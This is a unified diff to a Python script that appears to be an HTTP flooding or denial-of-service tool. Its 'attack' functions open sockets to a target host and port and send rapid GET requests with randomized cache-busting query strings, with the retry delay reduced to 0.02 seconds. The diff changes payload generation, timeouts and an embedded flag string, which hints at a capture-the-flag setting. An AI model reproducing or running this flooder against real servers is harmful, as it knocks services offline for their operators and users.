@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 #
-import hashlib, json, os, platform, requests, socket, sys, time ,uuid
+import hashlib, json, os, platform, random, requests, socket, sys, time ,uuid
 from datetime import datetime
 from threading import Timer
 #
@@ -37,8 +37,6 @@ admin = os.getlogin();
 admin = str(admin).replace('K', 'k').replace('l', 'L')
 MAC = hex(uuid.getnode());
 slEEp = 0.75
-
-
 
 ROOT = [""]
 #STAT = [socket.gethostname(),socket.gethostbyname(STAT[0])]
@@ -108,6 +106,12 @@ def hash5(txt):
   digest = result.hexdigest()
   return digest
 
+def cdata(init):
+  rawr = random.random()
+  rawr = str(rawr).replace("0.","")
+  raws = hash5(rawr)
+  return raws
+
 def reset(init):
   ossys('setterm --foreground default --background default --cursor on');
   if (init == 1):
@@ -135,7 +139,7 @@ def verif(init):
   except (IOError, OSError):
     txt = color(245, 45, 45, 'SYSTEM LOCKDOWN / SERVER OFFLINE / FILTERED / CLOSED PORT');
     write(f'\r\n {txt}\r\n');
-    reset(1)
+    reset(0)
   finally: pass
 
 def start(init):
@@ -233,7 +237,6 @@ class print_status():
         tx2 = color(99, 99, 99, 'Initial');
         tx3 = color(255, 215, 0, txt1);
         sys.stdout.write(f'\r {tx1} {tx2} {tx3}\r');
-        sys.stdout.flush();
 
     def success(self, time, txt1):
         tx1 = color(224,191,184, time);
@@ -241,7 +244,6 @@ class print_status():
         tx3 = color(248,152,128, txt1);
         tx4 = color(224,191,184, v4L);
         sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-        sys.stdout.flush();
 
     def timeout(self, time, txt1):
         tx1 = color(224,191,184, time);
@@ -249,7 +251,6 @@ class print_status():
         tx3 = '> ERR_CONNECTION_TIMEOUT_ERR';
         tx4 = color(0, 110, 210, '< RECONNECTING');
         sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-        sys.stdout.flush();
 
     def failure(self, time, txt1):
         tx1 = color(145, 145, 145, time);
@@ -257,14 +258,10 @@ class print_status():
         tx3 = color(255, 215, 0, 'No connection > server may be down');
         tx4 = color(224,191,184, '< RECONNECTING');
         sys.stdout.write(f'\r\n {tx1} {tx2} {tx3} {tx4}\r');
-        sys.stdout.flush();
 
-    flag = 'CTF{kwafeLt_wAS_hERE}';
-
+    flag = 'hsc{kwafeLt_wAS_hERE}';
 
 ###############################################################################
-
-
 
 def connect_h2_socket(host):
   sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -288,8 +285,8 @@ def attackORIG(init):
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
         try:
             address = (target_host, target_port);
-            proc.connect(address);
-            proc.settimeout(0.75);  # saat
+            proc.connect(address)
+            proc.settimeout(1.5)  # saat
             proc.sendto((f'GET /?{hexd} HTTP/1.1\r\nHost: {proxy}\r\n').encode('ascii'), address);
             proc.sendto((f'User-Agent: {user_agent}\r\nAccept-Encoding: gzip, deflate\r\n').encode('ascii'), address);
             proc.sendto((f'Accept: text/plain,*/*\r\nConnection: keep-alive\r\n').encode('ascii'), address);
@@ -318,19 +315,20 @@ def attackORIG(init):
     return slEEp;
 
 def attack(init):
-  global slEEp; time1 = ctim3(0); time2 = ctim3(1); hexd = hash5(time2)
+  global slEEp; time1 = ctim3(0); data = cdata(9)
   with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proc:
     try:
-      address = (target_host, target_port); proc.connect(address); proc.settimeout(1)
-      bytes1 = f'GET /?CDATA={hexd} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
+      address = (target_host, target_port); proc.connect(address); proc.settimeout(2)
+      bytes1 = f'GET /?!{data} {HTTP[1]}\r\nHost: {HOST[1]}\r\nUser-Agent: {user_agent}\r\n'
       bytes2 = f'Accept-Encoding: gzip, deflate\r\nConnection: {CONN[1]}\r\n\r\n'
       proc.sendto((bytes1).encode('ascii'), address)
       proc.sendto((bytes2).encode('ascii'), address)
       if (init == 'debug'):
-        response = proc.recv(4096); print(bytes1, bytes2); print(f'\r\n' + response.decode('ascii'))
+        response = proc.recv(4096); print(bytes1,bytes2); print(f'\r\n' + response.decode('ascii'))
         print(f'receiving {len(response)} bytes data...')
-      proc.shutdown(socket.SHUT_RDWR); proc.close();
-      slEEp = 0.02; st = print_status(); st.success(time1, hexd)
+      #response = proc.recv(4096) # D O R M A N
+      proc.shutdown(socket.SHUT_RDWR); proc.close()
+      slEEp = 0.02; st = print_status(); st.success(time1, data)
     except socket.timeout:
       slEEp = 0.50; st = print_status(); st.timeout(time1, None)
     except socket.error:
@@ -366,7 +364,7 @@ def process(i):
       finally: pass
 ################################################################################
 try:
-  parse(0); tt = 8
+  parse(0); cdata(0)
 except (KeyboardInterrupt, IOError, OSError):
   tx1 = color(204,204,255,'KEYBOARD INTERRUPT RECEIVED, EXITING / CLOSE ..');
   write(f'\n {tx1}\r\n'); sys.exit(0)
